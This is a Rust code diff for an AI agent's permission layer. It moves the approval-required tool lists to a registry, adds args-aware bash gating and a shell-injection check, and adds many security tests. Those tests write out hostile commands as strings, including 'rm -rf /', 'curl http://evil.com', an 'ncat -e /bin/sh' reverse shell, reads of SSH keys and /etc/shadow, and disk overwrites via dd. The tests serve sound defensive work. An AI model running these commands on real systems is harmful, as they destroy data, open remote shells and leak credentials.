@@ -4,29 +4,32 @@
 //! CLI permission prompts use [`cloud_gated_tool_kind`] so icons (Execute vs Write) and cloud gating
 //! cannot drift.
 
-/// Canonical tool names that must pass user approval (thin-client ledger) before edge execution.
-pub const CLOUD_APPROVAL_REQUIRED_TOOLS: &[&str] = &[
-    "bash",
-    "create_file",
-    "delete_file",
-    "edit_file",
-    "exec",
-    "git_commit",
-    "git_revert_commit",
-    "git_stash",
-    "github_create_issue",
-    "multi_edit",
-    "rollback_database_snapshots",
-    "rollback_file_edits",
-    "rollback_turn_actions",
-    "run_command",
-    "shell",
-    "str_replace",
-    "write_file",
-];
+/// Canonical tool names requiring user approval, derived from the central
+/// [`crate::tool_categories`] registry.
+pub static CLOUD_APPROVAL_REQUIRED_TOOLS: std::sync::LazyLock<Vec<&'static str>> =
+    std::sync::LazyLock::new(|| {
+        let mut v = crate::tool_categories::registry().approval_required_names();
+        v.sort();
+        v
+    });
 
-/// Subset of [`CLOUD_APPROVAL_REQUIRED_TOOLS`] that take a shell `command` argument (CLI ▶).
-pub const CLOUD_APPROVAL_EXECUTE_TOOLS: &[&str] = &["bash", "exec", "run_command", "shell"];
+/// Subset of approval-required tools that take a shell `command` argument.
+pub static CLOUD_APPROVAL_EXECUTE_TOOLS: std::sync::LazyLock<Vec<&'static str>> =
+    std::sync::LazyLock::new(|| {
+        let mut v = crate::tool_categories::registry().execute_command_names();
+        v.sort();
+        v
+    });
+
+/// Whether a tool name requires cloud approval.
+pub fn is_cloud_approval_required(name: &str) -> bool {
+    crate::tool_categories::registry().is_approval_required(name)
+}
+
+/// Whether a tool name is a shell/execute command.
+pub fn is_cloud_execute_tool(name: &str) -> bool {
+    crate::tool_categories::registry().is_execute_command(name)
+}
 
 /// Read-only shell commands that can run concurrently without user approval.
 /// These commands only read data and don't modify system state.
@@ -224,19 +227,13 @@ pub fn strip_benign_fd_redirects(command: &str) -> String {
 
 /// Strip `N> file` and `N>> file` (N ∈ 0..=9) including the following filename
 /// token. Pure string scan — no regex dependency in this hot path.
+#[allow(clippy::if_same_then_else)]
 fn strip_fd_redirect_to_file(input: &str) -> String {
     let bytes = input.as_bytes();
     let mut out = String::with_capacity(input.len());
     let mut i = 0;
     while i < bytes.len() {
         let b = bytes[i];
-        // Look for an fd-redirect operator at a left token boundary:
-        //   * `<digit>>`  / `<digit>>>`           — e.g. `2>foo`, `2>>foo`
-        //   * `&>` / `&>>` (bash combined redir)  — e.g. `&>foo`, `&>>foo`
-        //
-        // Left-boundary check guards against digit-in-argument cases like
-        // `echo a2>foo` where `a2` is echo's arg and `>foo` is a real
-        // stdout redirect — pinned by `fd_redirect_requires_left_token_boundary`.
         let left_ok = i == 0
             || matches!(
                 bytes[i - 1],
@@ -244,14 +241,12 @@ fn strip_fd_redirect_to_file(input: &str) -> String {
             );
         let op_len: Option<usize> =
             if left_ok && b.is_ascii_digit() && i + 1 < bytes.len() && bytes[i + 1] == b'>' {
-                // `N>` or `N>>`
                 if i + 2 < bytes.len() && bytes[i + 2] == b'>' {
                     Some(3)
                 } else {
                     Some(2)
                 }
             } else if left_ok && b == b'&' && i + 1 < bytes.len() && bytes[i + 1] == b'>' {
-                // `&>` or `&>>`
                 if i + 2 < bytes.len() && bytes[i + 2] == b'>' {
                     Some(3)
                 } else {
@@ -263,15 +258,9 @@ fn strip_fd_redirect_to_file(input: &str) -> String {
 
         if let Some(oplen) = op_len {
             let mut j = i + oplen;
-            // Skip spaces/tabs between operator and filename.
             while j < bytes.len() && (bytes[j] == b' ' || bytes[j] == b'\t') {
                 j += 1;
             }
-            // Consume the filename token (non-whitespace, non-pipe,
-            // non-semicolon, non-`&`). `&` is in the stop set because real
-            // redirect targets can't start with `&` in shell grammar — fd
-            // duplication uses `>&N` (no space), not `> &N`, so a lone `&`
-            // always marks the next command token or background operator.
             let had_token =
                 j < bytes.len() && !matches!(bytes[j], b' ' | b'\t' | b'\n' | b'|' | b';' | b'&');
             while j < bytes.len() && !matches!(bytes[j], b' ' | b'\t' | b'\n' | b'|' | b';' | b'&')
@@ -283,18 +272,7 @@ fn strip_fd_redirect_to_file(input: &str) -> String {
                 i = j;
                 continue;
             }
-            // Malformed tail (e.g. `cmd 2>` / `cmd &>` with no target):
-            // fall through to the UTF-8 copy path below. The operator bytes
-            // (digit/`&` and one or two `>`) are preserved verbatim across
-            // successive iterations so downstream `>` / `>>` scans see the
-            // original dangling redirect and conservatively classify as
-            // mutating. Contract pinned by
-            // `malformed_trailing_redirect_stays_conservative`.
         }
-        // Copy the next UTF-8 scalar verbatim. Using `char_indices`-style
-        // advancement keeps non-ASCII filenames (e.g. Chinese paths) intact
-        // instead of producing mojibake via `b as char` on a continuation
-        // byte.
         let ch = input[i..]
             .chars()
             .next()
@@ -304,6 +282,40 @@ fn strip_fd_redirect_to_file(input: &str) -> String {
         i += ch_len;
     }
     out
+}
+
+/// Shell metacharacters that can embed arbitrary commands or leak data.
+/// Checked before the read-only prefix match because `echo \`rm -rf /\``
+/// or `cat $HOME/.ssh/id_rsa` would otherwise pass as "read-only echo/cat".
+fn has_shell_injection_patterns(command: &str) -> bool {
+    // Backtick command substitution: `cmd`
+    if command.contains('`') {
+        return true;
+    }
+    // $(...) command substitution or ${...} brace expansion or $VAR
+    if command.contains("$(") || command.contains("${") {
+        return true;
+    }
+    // Bare $VAR references (but not standalone $ at end of string).
+    let bytes = command.as_bytes();
+    for i in 0..bytes.len().saturating_sub(1) {
+        if bytes[i] == b'$' {
+            let next = bytes[i + 1];
+            if next.is_ascii_alphabetic() || next == b'_' {
+                return true;
+            }
+        }
+    }
+    // Process substitution: <(...) or >(...)
+    if command.contains("<(") || command.contains(">(") {
+        return true;
+    }
+    // Background operator: trailing & (but not &&)
+    let trimmed = command.trim_end();
+    if trimmed.ends_with('&') && !trimmed.ends_with("&&") {
+        return true;
+    }
+    false
 }
 
 fn first_write_indicator(command: &str) -> Option<&'static str> {
@@ -326,10 +338,7 @@ fn matches_read_only_prefix(command: &str) -> bool {
 }
 
 fn has_shell_injection_vector(command: &str) -> bool {
-    // Deliberately deny-by-default at string level. This rejects harmless quoted
-    // literals such as `grep ';' file`, but keeps approval classification from
-    // needing to prove shell quoting correctness.
-    command.contains("$(") || command.contains('`') || command.contains(';')
+    has_shell_injection_patterns(command) || command.contains(';')
 }
 
 fn split_compound_segments(command: &str) -> impl Iterator<Item = &str> {
@@ -344,20 +353,16 @@ fn split_compound_segments(command: &str) -> impl Iterator<Item = &str> {
 /// Why a bash command was classified as **requiring approval** (not read-only).
 ///
 /// Returned by [`bash_command_approval_reason`]. Surfaced in CLI approval
-/// prompts so users can understand *why* a command tripped the classifier
-/// (e.g. "writes to file via `>`", "shell injection vector `$(`", …) rather
-/// than just seeing a generic "approval required" banner.
+/// prompts so users can understand *why* a command tripped the classifier.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum BashApprovalReason {
     /// Command string was empty after trimming.
     Empty,
-    /// Contains `$(`, backtick, or `;` — can hide arbitrary commands.
+    /// Contains shell injection vectors.
     ShellInjection,
-    /// Contains a write indicator (`>`, `rm`, `sed -i`, etc.). `String` is
-    /// the first matched indicator for display.
+    /// Contains a write indicator (`>`, `rm`, `sed -i`, etc.).
     WriteIndicator(String),
-    /// Command prefix is not in the read-only allowlist. `String` is the
-    /// first token (e.g. `foobar`, `npm`) for display.
+    /// Command prefix is not in the read-only allowlist.
     UnknownPrefix(String),
 }
 
@@ -370,40 +375,21 @@ impl BashApprovalReason {
                 "shell injection vector (`$(…)`, backtick, or `;`)".to_string()
             }
             BashApprovalReason::WriteIndicator(ind) => {
-                // Action-oriented phrasing tells the user *what the command
-                // does*; the raw token is cited in parentheses so power users
-                // can still correlate with their command text.
                 let action = humanize_write_indicator(ind.as_str());
                 format!("{action} (`{trimmed}`)", trimmed = ind.trim())
             }
             BashApprovalReason::UnknownPrefix(tok) => {
-                // Frame as risk ("may modify your system") rather than
-                // implementation detail ("not in allowlist") — the latter is
-                // jargon for non-developer users.
                 format!("`{tok}` may modify your system (unrecognized command)")
             }
         }
     }
 }
 
-/// Map a [`WRITE_INDICATORS`] token to an action-oriented phrase suitable
-/// for end-user approval prompts. Falls back to a generic phrase when no
-/// specific mapping exists (so new indicators added to `WRITE_INDICATORS`
-/// don't silently regress to machine-translation-y default text).
-///
-/// Kept as a small, explicit table rather than a HashMap: the indicator list
-/// is static and short, ordering doesn't matter, and a table is grep-friendly
-/// for future maintainers.
 fn humanize_write_indicator(indicator: &str) -> &'static str {
-    // Prefix-match table ordered most-specific-first so `"sed -i"` wins over
-    // a hypothetical shorter `"sed"`. We match by `starts_with` (after trim)
-    // because some indicators carry a trailing space (e.g. `"rm "`).
     let trimmed = indicator.trim();
     const TABLE: &[(&str, &str)] = &[
-        // Redirections — most common case; glyph is opaque to non-technical users.
         (">>", "appends to a file"),
         (">", "writes to a file"),
-        // File operations
         ("rm", "deletes files"),
         ("mv", "moves or renames files"),
         ("cp", "copies files"),
@@ -415,7 +401,6 @@ fn humanize_write_indicator(indicator: &str) -> &'static str {
         ("ln", "creates a link"),
         ("sed -i", "edits files in place"),
         ("perl -pi", "edits files in place"),
-        // Git write verbs
         ("git add", "stages changes in git"),
         ("git commit", "creates a git commit"),
         ("git push", "pushes to a remote"),
@@ -431,7 +416,6 @@ fn humanize_write_indicator(indicator: &str) -> &'static str {
         ("git clean", "deletes untracked files"),
         ("git rm", "removes files from git"),
         ("git mv", "moves files in git"),
-        // Package managers
         ("npm install", "installs packages"),
         ("npm i", "installs packages"),
         ("npm uninstall", "uninstalls packages"),
@@ -441,7 +425,6 @@ fn humanize_write_indicator(indicator: &str) -> &'static str {
         ("pip uninstall", "uninstalls packages"),
         ("cargo install", "installs a cargo binary"),
         ("cargo build", "builds the cargo project"),
-        // Pipes that can execute arbitrary code
         ("| tee", "writes via `tee`"),
         ("| xargs", "pipes to `xargs` (may execute commands)"),
         ("| sh", "pipes into a shell"),
@@ -453,9 +436,6 @@ fn humanize_write_indicator(indicator: &str) -> &'static str {
             return phrase;
         }
     }
-    // Conservative fallback: new indicators added to WRITE_INDICATORS without
-    // a humanized mapping still get a non-jargon phrase. The raw token is
-    // appended by the caller so users see what tripped.
     "may modify your system"
 }
 
@@ -557,17 +537,30 @@ pub enum CloudGatedToolKind {
 }
 
 /// Returns [`None`] when the tool is not cloud-gated (treated as read-only for approval purposes).
+/// Name-only variant: does not inspect arguments.
 #[inline]
 pub fn cloud_gated_tool_kind(name: &str) -> Option<CloudGatedToolKind> {
-    // MCP tools run external server code with unknown side effects —
-    // treat them as Execute (highest-risk) for permission gating.
+    cloud_gated_tool_kind_with_args(name, None)
+}
+
+/// Args-aware variant: for shell tools, inspects the `command` argument.
+///
+/// `bash "git status"` → `None` (read-only, no approval needed).
+/// `bash "rm -rf /"` → `Some(Execute)` (mutating, approval required).
+/// `bash` (no args) → `Some(Execute)` (fail-closed).
+#[inline]
+pub fn cloud_gated_tool_kind_with_args(
+    name: &str,
+    args: Option<&serde_json::Value>,
+) -> Option<CloudGatedToolKind> {
     if name.starts_with("mcp_") {
         return Some(CloudGatedToolKind::Execute);
     }
-    if !CLOUD_APPROVAL_REQUIRED_TOOLS.contains(&name) {
+    let classification = crate::tool_categories::classify(name, args);
+    if !classification.approval_required {
         return None;
     }
-    if CLOUD_APPROVAL_EXECUTE_TOOLS.contains(&name) {
+    if is_cloud_execute_tool(name) {
         Some(CloudGatedToolKind::Execute)
     } else {
         Some(CloudGatedToolKind::Write)
@@ -580,13 +573,22 @@ pub fn edge_tool_requires_cloud_approval(name: &str) -> bool {
     cloud_gated_tool_kind(name).is_some()
 }
 
+/// Args-aware variant: `bash "git status"` returns false (no approval).
+#[inline]
+pub fn edge_tool_requires_cloud_approval_with_args(
+    name: &str,
+    args: Option<&serde_json::Value>,
+) -> bool {
+    cloud_gated_tool_kind_with_args(name, args).is_some()
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
 
     #[test]
     fn each_listed_tool_requires_approval() {
-        for &name in CLOUD_APPROVAL_REQUIRED_TOOLS {
+        for &name in CLOUD_APPROVAL_REQUIRED_TOOLS.iter() {
             assert!(
                 edge_tool_requires_cloud_approval(name),
                 "list entry must satisfy predicate: {name}"
@@ -612,25 +614,23 @@ mod tests {
 
     #[test]
     fn list_is_sorted_for_stable_diffs() {
-        let mut sorted = CLOUD_APPROVAL_REQUIRED_TOOLS.to_vec();
+        let mut sorted = CLOUD_APPROVAL_REQUIRED_TOOLS.clone();
         sorted.sort_unstable();
         assert_eq!(
-            CLOUD_APPROVAL_REQUIRED_TOOLS,
-            sorted.as_slice(),
+            *CLOUD_APPROVAL_REQUIRED_TOOLS, sorted,
             "CLOUD_APPROVAL_REQUIRED_TOOLS should stay sorted"
         );
     }
 
     #[test]
     fn execute_tools_sorted_and_subset_of_required() {
-        let mut sorted = CLOUD_APPROVAL_EXECUTE_TOOLS.to_vec();
+        let mut sorted = CLOUD_APPROVAL_EXECUTE_TOOLS.clone();
         sorted.sort_unstable();
         assert_eq!(
-            CLOUD_APPROVAL_EXECUTE_TOOLS,
-            sorted.as_slice(),
+            *CLOUD_APPROVAL_EXECUTE_TOOLS, sorted,
             "CLOUD_APPROVAL_EXECUTE_TOOLS should stay sorted"
         );
-        for &name in CLOUD_APPROVAL_EXECUTE_TOOLS {
+        for &name in CLOUD_APPROVAL_EXECUTE_TOOLS.iter() {
             assert!(
                 CLOUD_APPROVAL_REQUIRED_TOOLS.contains(&name),
                 "{name} must appear in CLOUD_APPROVAL_REQUIRED_TOOLS"
@@ -640,7 +640,7 @@ mod tests {
 
     #[test]
     fn required_tools_partition_into_execute_and_write() {
-        for &name in CLOUD_APPROVAL_REQUIRED_TOOLS {
+        for &name in CLOUD_APPROVAL_REQUIRED_TOOLS.iter() {
             let kind = cloud_gated_tool_kind(name).expect("required tools must classify");
             match kind {
                 CloudGatedToolKind::Execute => {
@@ -824,7 +824,6 @@ mod tests {
 
     #[test]
     fn non_mcp_unknown_tool_not_gated() {
-        // "mcp" without underscore prefix should NOT match
         assert!(!edge_tool_requires_cloud_approval("mcp"));
         assert!(!edge_tool_requires_cloud_approval("my_mcp_tool"));
     }
@@ -1096,5 +1095,292 @@ mod tests {
         // operator and made `cargo check &>` look read-only.
         assert!(!bash_command_is_read_only("cargo check &>"));
         assert!(!bash_command_is_read_only("cargo check &>>"));
+    }
+    // ── Args-aware cloud approval tests ──
+
+    #[test]
+    fn bash_git_status_skips_cloud_approval() {
+        let args = serde_json::json!({"command": "git status"});
+        assert!(!edge_tool_requires_cloud_approval_with_args(
+            "bash",
+            Some(&args)
+        ));
+        assert_eq!(cloud_gated_tool_kind_with_args("bash", Some(&args)), None);
+    }
+
+    #[test]
+    fn bash_ls_skips_cloud_approval() {
+        let args = serde_json::json!({"command": "ls -la"});
+        assert!(!edge_tool_requires_cloud_approval_with_args(
+            "bash",
+            Some(&args)
+        ));
+    }
+
+    #[test]
+    fn bash_cargo_check_skips_cloud_approval() {
+        let args = serde_json::json!({"command": "cargo check 2>&1 | head -50"});
+        assert!(!edge_tool_requires_cloud_approval_with_args(
+            "bash",
+            Some(&args)
+        ));
+    }
+
+    #[test]
+    fn bash_rm_requires_cloud_approval() {
+        let args = serde_json::json!({"command": "rm -rf /"});
+        assert!(edge_tool_requires_cloud_approval_with_args(
+            "bash",
+            Some(&args)
+        ));
+        assert_eq!(
+            cloud_gated_tool_kind_with_args("bash", Some(&args)),
+            Some(CloudGatedToolKind::Execute)
+        );
+    }
+
+    #[test]
+    fn bash_git_push_requires_cloud_approval() {
+        let args = serde_json::json!({"command": "git push origin main"});
+        assert!(edge_tool_requires_cloud_approval_with_args(
+            "bash",
+            Some(&args)
+        ));
+    }
+
+    #[test]
+    fn bash_no_args_requires_cloud_approval() {
+        assert!(edge_tool_requires_cloud_approval_with_args("bash", None));
+        assert_eq!(
+            cloud_gated_tool_kind_with_args("bash", None),
+            Some(CloudGatedToolKind::Execute)
+        );
+    }
+
+    #[test]
+    fn bash_empty_command_requires_cloud_approval() {
+        let args = serde_json::json!({"command": ""});
+        assert!(edge_tool_requires_cloud_approval_with_args(
+            "bash",
+            Some(&args)
+        ));
+    }
+
+    #[test]
+    fn read_only_tools_skip_approval_with_args() {
+        let args = serde_json::json!({"file_path": "/foo/bar"});
+        assert!(!edge_tool_requires_cloud_approval_with_args(
+            "read_file",
+            Some(&args)
+        ));
+        assert!(!edge_tool_requires_cloud_approval_with_args(
+            "grep",
+            Some(&args)
+        ));
+    }
+
+    #[test]
+    fn write_file_still_requires_approval_with_args() {
+        let args = serde_json::json!({"file_path": "/foo/bar", "content": "hello"});
+        assert!(edge_tool_requires_cloud_approval_with_args(
+            "write_file",
+            Some(&args)
+        ));
+        assert_eq!(
+            cloud_gated_tool_kind_with_args("write_file", Some(&args)),
+            Some(CloudGatedToolKind::Write)
+        );
+    }
+
+    #[test]
+    fn mcp_tools_always_require_approval_with_args() {
+        let args = serde_json::json!({"command": "ls"});
+        assert!(edge_tool_requires_cloud_approval_with_args(
+            "mcp_tool",
+            Some(&args)
+        ));
+        assert_eq!(
+            cloud_gated_tool_kind_with_args("mcp_tool", Some(&args)),
+            Some(CloudGatedToolKind::Execute)
+        );
+    }
+
+    // ── Security: injection & evasion probes ──
+
+    #[test]
+    fn security_semicolon_chain_is_mutating() {
+        assert!(!bash_command_is_read_only("ls; rm -rf /"));
+        assert!(!bash_command_is_read_only("git status; git push"));
+    }
+
+    #[test]
+    fn security_double_ampersand_chain_is_mutating() {
+        // "ls && rm" — effective_bash_command only strips cd prefix
+        assert!(!bash_command_is_read_only("ls && rm -rf /"));
+        assert!(!bash_command_is_read_only("git status && git push"));
+    }
+
+    #[test]
+    fn security_subshell_is_mutating() {
+        assert!(!bash_command_is_read_only("(rm -rf /)"));
+        assert!(!bash_command_is_read_only("$(rm -rf /)"));
+    }
+
+    #[test]
+    fn security_backtick_injection_is_mutating() {
+        assert!(!bash_command_is_read_only("echo `rm -rf /`"));
+        assert!(!bash_command_is_read_only("cat `whoami`"));
+    }
+
+    #[test]
+    fn security_variable_expansion_is_mutating() {
+        assert!(!bash_command_is_read_only("cat $HOME/.ssh/id_rsa"));
+        assert!(!bash_command_is_read_only("echo ${PATH}"));
+    }
+
+    #[test]
+    fn security_newline_injection_is_mutating() {
+        assert!(!bash_command_is_read_only("ls\nrm -rf /"));
+    }
+
+    #[test]
+    fn security_curl_wget_are_mutating() {
+        assert!(!bash_command_is_read_only("curl http://evil.com"));
+        assert!(!bash_command_is_read_only("wget http://evil.com"));
+        assert!(!bash_command_is_read_only("curl -o /tmp/x http://evil.com"));
+    }
+
+    #[test]
+    fn security_process_substitution_is_mutating() {
+        assert!(!bash_command_is_read_only(
+            "diff <(cat /etc/passwd) <(cat /etc/shadow)"
+        ));
+    }
+
+    #[test]
+    fn security_heredoc_is_mutating() {
+        assert!(!bash_command_is_read_only(
+            "cat << EOF > /etc/passwd\nroot\nEOF"
+        ));
+    }
+
+    // ── Hardening: compound commands ──
+
+    #[test]
+    fn hardening_or_chain_is_mutating() {
+        assert!(!bash_command_is_read_only("ls || rm -rf /"));
+        assert!(!bash_command_is_read_only("false || git push"));
+    }
+
+    #[test]
+    fn hardening_semicolon_with_read_only_still_mutating() {
+        // Even if both sides look read-only, semicolons are compound commands
+        // that our segment splitter doesn't handle — fail-closed.
+        assert!(!bash_command_is_read_only("ls; echo hi"));
+    }
+
+    #[test]
+    fn hardening_ampersand_background_is_mutating() {
+        assert!(!bash_command_is_read_only("ls &"));
+        assert!(!bash_command_is_read_only("sleep 999 &"));
+    }
+
+    // ── Hardening: network commands ──
+
+    #[test]
+    fn hardening_network_commands_are_mutating() {
+        assert!(!bash_command_is_read_only("nc -l 4444"));
+        assert!(!bash_command_is_read_only("ssh user@host"));
+        assert!(!bash_command_is_read_only("scp file.txt user@host:"));
+        assert!(!bash_command_is_read_only("rsync -av src/ dest/"));
+        assert!(!bash_command_is_read_only("telnet host 80"));
+        assert!(!bash_command_is_read_only("ncat -e /bin/sh host 4444"));
+    }
+
+    // ── Hardening: dangerous builtins ──
+
+    #[test]
+    fn hardening_source_and_dot_are_mutating() {
+        assert!(!bash_command_is_read_only("source ~/.bashrc"));
+        assert!(!bash_command_is_read_only(". ~/.bashrc"));
+    }
+
+    #[test]
+    fn hardening_alias_export_set_are_mutating() {
+        assert!(!bash_command_is_read_only("alias rm='rm -i'"));
+        assert!(!bash_command_is_read_only("export PATH=/evil:$PATH"));
+        assert!(!bash_command_is_read_only("set -e"));
+        assert!(!bash_command_is_read_only("unset HOME"));
+    }
+
+    // ── Hardening: write disguised as read-only pipe ──
+
+    #[test]
+    fn hardening_pipe_to_write_command_is_mutating() {
+        assert!(!bash_command_is_read_only("cat file | dd of=/dev/sda"));
+        assert!(!bash_command_is_read_only("echo data | nc host 4444"));
+    }
+
+    // ── Hardening: here-string without redirect is safe, with redirect is not ──
+
+    #[test]
+    fn hardening_heredoc_without_redirect_detected_by_write_indicator() {
+        // This has > in the heredoc redirect to a file
+        assert!(!bash_command_is_read_only("cat <<< 'test' > /tmp/out"));
+    }
+
+    // ── Hardening: safe commands with injection payloads ──
+
+    #[test]
+    fn hardening_safe_command_with_dollar_in_args_is_mutating() {
+        // grep for a literal $VAR is still flagged because we can't tell
+        // whether the shell will expand it before exec.
+        assert!(!bash_command_is_read_only("grep $HOME /etc/passwd"));
+        assert!(!bash_command_is_read_only("echo $(id)"));
+        assert!(!bash_command_is_read_only("ls `pwd`"));
+    }
+
+    // ── Hardening: legitimate read-only commands still work ──
+
+    #[test]
+    fn hardening_legitimate_read_only_not_broken() {
+        // Ensure the hardening doesn't break normal read-only commands
+        assert!(bash_command_is_read_only("git status"));
+        assert!(bash_command_is_read_only("ls -la"));
+        assert!(bash_command_is_read_only("cat file.txt"));
+        assert!(bash_command_is_read_only("grep -r pattern ."));
+        assert!(bash_command_is_read_only("find . -name '*.rs'"));
+        assert!(bash_command_is_read_only("cargo check 2>&1 | head -50"));
+        assert!(bash_command_is_read_only("cd project && ls"));
+        assert!(bash_command_is_read_only("wc -l file.txt"));
+        assert!(bash_command_is_read_only("git log --oneline -20"));
+        assert!(bash_command_is_read_only("git diff HEAD~3"));
+    }
+
+    // ── Hardening: ensure benign $ patterns don't false positive ──
+
+    #[test]
+    fn hardening_dollar_in_non_variable_position_is_ok() {
+        // Trailing $ or $ followed by non-alpha are benign
+        assert!(bash_command_is_read_only("grep 'price is 5$' file.txt"));
+        assert!(bash_command_is_read_only("grep '$$' file.txt"));
+    }
+
+    #[test]
+    fn args_aware_backward_compatible_with_name_only() {
+        // Every tool that required approval without args still requires it
+        for &name in CLOUD_APPROVAL_REQUIRED_TOOLS.iter() {
+            assert!(
+                edge_tool_requires_cloud_approval_with_args(name, None),
+                "{name} should still require approval when called without args"
+            );
+        }
+        // Every tool that didn't require approval without args still doesn't
+        for name in ["read_file", "grep", "glob", "git_status"] {
+            assert!(
+                !edge_tool_requires_cloud_approval_with_args(name, None),
+                "{name} should still skip approval when called without args"
+            );
+        }
     }
 }
